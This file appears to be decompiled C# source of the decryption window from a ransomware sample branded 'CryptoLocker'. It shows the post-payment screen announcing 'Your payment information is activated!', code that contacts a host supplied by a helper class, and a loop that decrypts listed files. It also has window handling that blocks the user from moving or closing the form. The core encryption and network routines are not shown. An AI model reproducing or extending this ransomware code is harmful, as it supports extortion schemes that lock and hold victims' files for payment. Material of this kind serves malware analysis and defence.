using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Final;

public class Form4 : Form
{
	[CompilerGenerated]
	private sealed class Class1
	{
		public string string_0;

		public Form4 form4_0;

		public void method_0()
		{
			form4_0.method_1(string_0);
		}
	}

	private GClass0 gclass0_0 = new GClass0();

	private string[] string_0;

	private Timer timer_0 = new Timer();

	private IContainer icontainer_0;

	private PictureBox pictureBox1;

	private Label label11;

	private Label label12;

	private Label label13;

	private Label label14;

	private Label label16;

	private Label label1;

	private Panel panel1;

	private Label label4;

	private Label label15;

	private ProgressBar progressBar1;

	private Label label17;

	private Label label2;

	private ProgressBar progressBar2;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public Form4()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		InitializeComponent();
	}

	protected override void WndProc(ref Message m)
	{
		if ((((Message)(ref m)).get_Msg() != 274 || ((Message)(ref m)).get_WParam().ToInt32() != 61456) && (((Message)(ref m)).get_Msg() != 161 || ((Message)(ref m)).get_WParam().ToInt32() != 2))
		{
			((Form)this).WndProc(ref m);
		}
	}

	private void Form4_Load(object sender, EventArgs e)
	{
		gclass0_0.method_7();
		this.string_0 = gclass0_0.method_20();
		string string_0 = "http://" + gclass0_0.method_4() + "/";
		progressBar2.set_MarqueeAnimationSpeed(30);
		Thread thread = new Thread((ThreadStart)delegate
		{
			method_1(string_0);
		});
		thread.Start();
	}

	private void method_0(object sender, EventArgs e)
	{
		((Control)this).Hide();
		Form3 form = new Form3();
		((Control)form).Show();
	}

	public void method_1(string string_1)
	{
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Invalid comparison between Unknown and I4
		Thread.Sleep(5000);
		Mutex mutex = new Mutex();
		if (gclass0_0.method_13(string_1))
		{
			progressBar1.set_Style((ProgressBarStyle)0);
			progressBar1.set_Minimum(0);
			progressBar1.set_Maximum(gclass0_0.method_22());
			((Control)progressBar2).set_Visible(false);
			string[] array = string_0;
			foreach (string text in array)
			{
				mutex.WaitOne();
				if (!(text == ""))
				{
					((Control)label17).set_Text(text);
					progressBar1.Increment(1);
					gclass0_0.method_21(text);
					mutex.ReleaseMutex();
				}
			}
			mutex.WaitOne();
			DialogResult val = MessageBox.Show("Search and decryption of the found files completed. \n\nMake sure that all important files have been decrypted! If part of the files had not been decrypted - move them to the desktop and click <<Retry>> button. \n\nOtherwise, press <<Cancel>> button - this will delete the software from this computer. Please restart your computer to completely destroy this software!", "Attention!", (MessageBoxButtons)5, (MessageBoxIcon)48);
			if ((int)val == 4)
			{
				gclass0_0.method_23();
				gclass0_0.method_24();
			}
			else
			{
				gclass0_0.method_24();
			}
			mutex.ReleaseMutex();
		}
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Expected O, but got Unknown
		//IL_01f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fc: Expected O, but got Unknown
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_027f: Expected O, but got Unknown
		//IL_02f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0302: Expected O, but got Unknown
		//IL_037b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0385: Expected O, but got Unknown
		//IL_03ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f8: Expected O, but got Unknown
		//IL_0563: Unknown result type (might be due to invalid IL or missing references)
		//IL_056d: Expected O, but got Unknown
		//IL_0608: Unknown result type (might be due to invalid IL or missing references)
		//IL_0612: Expected O, but got Unknown
		//IL_06de: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e8: Expected O, but got Unknown
		//IL_076a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0774: Expected O, but got Unknown
		//IL_090f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0919: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form4));
		pictureBox1 = new PictureBox();
		label11 = new Label();
		label12 = new Label();
		label13 = new Label();
		label14 = new Label();
		label16 = new Label();
		label1 = new Label();
		panel1 = new Panel();
		label2 = new Label();
		label17 = new Label();
		progressBar1 = new ProgressBar();
		label15 = new Label();
		label4 = new Label();
		progressBar2 = new ProgressBar();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		pictureBox1.set_ErrorImage((Image)null);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(12, 57));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(255, 258));
		pictureBox1.set_TabIndex(2);
		pictureBox1.set_TabStop(false);
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_BackColor(Color.White);
		((Control)label11).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_Location(new Point(364, 105));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(0, 19));
		((Control)label11).set_TabIndex(22);
		((Control)label12).set_AutoSize(true);
		((Control)label12).set_BackColor(Color.White);
		((Control)label12).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label12).set_Location(new Point(344, 135));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(0, 19));
		((Control)label12).set_TabIndex(23);
		((Control)label13).set_AutoSize(true);
		((Control)label13).set_BackColor(Color.White);
		((Control)label13).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label13).set_Location(new Point(305, 164));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(0, 19));
		((Control)label13).set_TabIndex(24);
		((Control)label14).set_AutoSize(true);
		((Control)label14).set_BackColor(Color.White);
		((Control)label14).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label14).set_Location(new Point(341, 192));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(0, 19));
		((Control)label14).set_TabIndex(25);
		((Control)label16).set_AutoSize(true);
		((Control)label16).set_BackColor(Color.White);
		((Control)label16).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label16).set_Location(new Point(321, 251));
		((Control)label16).set_Name("label16");
		((Control)label16).set_Size(new Size(0, 19));
		((Control)label16).set_TabIndex(27);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(416, 25));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(170, 24));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Files decryption");
		((Control)panel1).set_BackColor(Color.White);
		((Control)panel1).get_Controls().Add((Control)(object)progressBar2);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).get_Controls().Add((Control)(object)label17);
		((Control)panel1).get_Controls().Add((Control)(object)progressBar1);
		((Control)panel1).get_Controls().Add((Control)(object)label15);
		((Control)panel1).get_Controls().Add((Control)(object)label4);
		((Control)panel1).set_Location(new Point(274, 57));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(432, 450));
		((Control)panel1).set_TabIndex(29);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Maroon);
		((Control)label2).set_Location(new Point(17, 327));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(390, 98));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		label2.set_TextAlign((ContentAlignment)2);
		((Control)label17).set_AutoSize(true);
		((Control)label17).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label17).set_Location(new Point(17, 149));
		((Control)label17).set_Name("label17");
		((Control)label17).set_Size(new Size(20, 14));
		((Control)label17).set_TabIndex(4);
		((Control)label17).set_Text("C:\\");
		((Control)progressBar1).set_Location(new Point(17, 168));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(398, 23));
		progressBar1.set_Style((ProgressBarStyle)2);
		((Control)progressBar1).set_TabIndex(3);
		((Control)label15).set_AutoSize(true);
		((Control)label15).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label15).set_Location(new Point(122, 45));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(200, 14));
		((Control)label15).set_TabIndex(2);
		((Control)label15).set_Text("Search and recovery of encrypted files!");
		label15.set_TextAlign((ContentAlignment)2);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(122, 19));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(190, 14));
		((Control)label4).set_TabIndex(1);
		((Control)label4).set_Text("Your payment information is activated!");
		label4.set_TextAlign((ContentAlignment)2);
		((Control)progressBar2).set_Location(new Point(17, 168));
		((Control)progressBar2).set_Name("progressBar2");
		((Control)progressBar2).set_Size(new Size(398, 23));
		progressBar2.set_Style((ProgressBarStyle)2);
		((Control)progressBar2).set_TabIndex(6);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(721, 573));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)label16);
		((Control)this).get_Controls().Add((Control)(object)label14);
		((Control)this).get_Controls().Add((Control)(object)label13);
		((Control)this).get_Controls().Add((Control)(object)label12);
		((Control)this).get_Controls().Add((Control)(object)label11);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Cursor(Cursors.get_Default());
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form4");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("CryptoLocker");
		((Form)this).add_Load((EventHandler)Form4_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
